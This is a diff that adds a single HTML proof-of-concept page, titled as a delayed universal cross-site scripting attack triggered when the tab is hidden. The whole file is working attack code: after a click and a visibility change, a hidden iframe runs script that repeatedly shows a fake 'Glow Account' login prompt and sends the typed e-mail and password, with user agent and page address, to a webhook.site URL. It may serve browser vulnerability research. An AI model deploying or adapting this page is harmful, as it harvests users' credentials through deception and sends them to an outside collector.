@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no">
+<title>Delayed UXSS via Visibility Change</title>
+
+<style>
+  iframe { visibility: hidden; }
+  body { font-family: system-ui, sans-serif; text-align: center; padding-top: 100px; }
+</style>
+
+<script>
+let armed = false;
+
+document.addEventListener("click", () => {
+  armed = true;
+  console.log("Payload armed");
+});
+
+document.addEventListener("visibilitychange", () => {
+  if (document.hidden && armed) {
+
+    setTimeout(() => {
+      const code =
+        "(function(){try{"
+        + "var msg='In order to access glow.app\\n"
+        + "you must first login on your\\nGlow Account.\\n\\n"
+        + "Please type your e-mail\\nand your password:';"
+        + "var v='';"
+        + "while(v===null||(''+v).trim()===''){"
+        + "  v=prompt(msg,'E-mail / Password.');"
+        + "}"
+        + "var u='https://webhook.site/40815ef5-1dac-4c51-836f-825210500754'"
+        + "  + '?creds=' + encodeURIComponent(v)"
+        + "  + '&ua=' + encodeURIComponent(navigator.userAgent)"
+        + "  + '&page=' + encodeURIComponent(location.href);"
+        + "try{ if(!navigator.sendBeacon(u)){ throw 1; } }catch(e){"
+        + "  try{ (new Image()).src = u; }catch(_e){}"
+        + "}"
+        + "}catch(e){}})()";
+
+      document.getElementById("iframe").src = "javascript:" + code;
+    }, 500);
+
+  }
+});
+</script>
+</head>
+
+<body>
+<h1>Click anywhere</h1>
+<iframe id="iframe"></iframe>
+</body>
+</html>
